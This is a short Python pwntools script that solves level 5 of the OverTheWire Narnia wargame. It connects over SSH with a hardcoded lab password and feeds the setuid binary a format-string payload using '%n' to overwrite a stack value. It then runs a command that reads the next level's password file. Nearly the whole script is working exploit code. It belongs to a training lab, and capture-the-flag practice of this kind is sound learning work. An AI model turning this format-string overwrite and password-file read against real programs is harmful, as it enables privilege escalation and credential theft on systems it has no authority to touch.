import pwn
#using a format string vulunerability we use %x to view the stack and move up the st#ack and change its value to 500
s=pwn.ssh(user='narnia5', host='narnia.labs.overthewire.org', password='faimahchiy', port=2226)
payload=bytes('\xc0\xdc\xff\xff%496x%1$n', 'utf-8')
sh=s.run(b'/narnia/narnia5 $(python -c \'print "\xc0\xdc\xff\xff" + "%496x%1$n"\')')
print(sh.recv(timeout=0.1))
sh.sendline(b'cat /etc/narnia_pass/narnia6')
pwn.log.info("Flag is: "+sh.recvline().decode('utf-8')[:-1])
s.close()
